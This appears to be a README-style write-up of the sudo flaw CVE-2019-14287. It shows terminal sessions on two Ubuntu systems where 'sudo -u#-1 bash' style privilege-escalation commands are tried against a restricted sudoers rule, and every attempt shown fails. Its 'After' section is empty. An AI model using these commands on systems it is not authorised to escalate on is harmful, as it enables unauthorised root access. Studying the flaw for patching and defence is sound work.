## CVE2019-14287 (sudo < 1.8.28)
Sudo Flaw Linux Users Can Run Commands As Root Even When They're Restricted

## Sudo Vulnerabilty Descriptions
```
The vulnerability in a sudo security policy bypass issue that could allow a malicious user or a program to
execute arbitrary commands as root on a targeted Linux system even when the "sudoers configuration" explicitly
disallows the root access.
```
```
So, even if a user has been restricted to run a specific, or any, command as root, the vulnerability could allow the user to
bypass this security policy and take complete control over the system.
```
## Who Discovered this ?
```
An Apple Information Security Researcher by Joe Vennix
```

## Didn't work on
```
Sudo version 1.8.3p1
OS: Ubuntu 12.04.5 LTS \n \l
Kernel: Linux ubuntu 3.13.0-117-generic
```
```
lucy@ubuntu:/home/debian$ whoami
lucy
lucy@ubuntu:/home/debian$ groups
lucy
lucy@ubuntu:/home/debian$ sudo whoami
Sorry, user lucy is not allowed to execute '/usr/bin/whoami' as root on ubuntu.
lucy@ubuntu:/home/debian$ sudo bash
Sorry, user lucy is not allowed to execute '/bin/bash' as root on ubuntu.
lucy@ubuntu:/home/debian$ sudo -l
Matching Defaults entries for lucy on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on this host:
    (ALL, !root) /usr/bin/bash
lucy@ubuntu:/home/debian$ sudo bash
Sorry, user lucy is not allowed to execute '/bin/bash' as root on ubuntu.
lucy@ubuntu:/home/debian$ sudo -u#4294967295 bash 
Sorry, user lucy is not allowed to execute '/bin/bash' as #4294967295 on ubuntu.
lucy@ubuntu:/home/debian$ sudo -u#-1 bash 
Sorry, user lucy is not allowed to execute '/bin/bash' as #-1 on ubuntu.
```
## This also didn't work
```
lucy@ubuntu:/home/debian$ sudo -u#4294967295 bash -u
[sudo] password for lucy: 
Sorry, user lucy is not allowed to execute '/bin/bash -u' as #4294967295 on ubuntu.
lucy@ubuntu:/home/debian$ 
lucy@ubuntu:/home/debian$ sudo -u#-1 bash -u
[sudo] password for lucy: 
Sorry, user lucy is not allowed to execute '/bin/bash -u' as #-1 on ubuntu.
```

## Let's check another OS with latest sudo versions.
```
Sudo version 1.8.16
OS: Ubuntu 16.04.6 LTS \n \l
Kernel: Linux blak-off 4.15.0-65-generic
```

## This also didn't work
```
blak@blak-off:~$ su john
Password: 
john@blak-off:/home/blak$ whoami
john
john@blak-off:/home/blak$ groups
john
john@blak-off:/home/blak$ sudo whoami
[sudo] password for john: 
Sorry, user john is not allowed to execute '/usr/bin/whoami' as root on blak-off.
john@blak-off:/home/blak$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on blak-off:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on blak-off:
    (ALL, !root) /usr/bin/bash
john@blak-off:/home/blak$ sudo bash
Sorry, user john is not allowed to execute '/bin/bash' as root on blak-off.
john@blak-off:/home/blak$ sudo -u#4294967295 bash
Sorry, user john is not allowed to execute '/bin/bash' as #4294967295 on blak-off.
john@blak-off:/home/blak$ sudo -u#-1 bash
Sorry, user john is not allowed to execute '/bin/bash' as #-1 on blak-off.
john@blak-off:/home/blak$ sudo -u#-1 bash -u
Sorry, user john is not allowed to execute '/bin/bash -u' as #-1 on blak-off.
```


## After 
## Exploit type
```
Privilege Escalation 
```
## References:
https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html
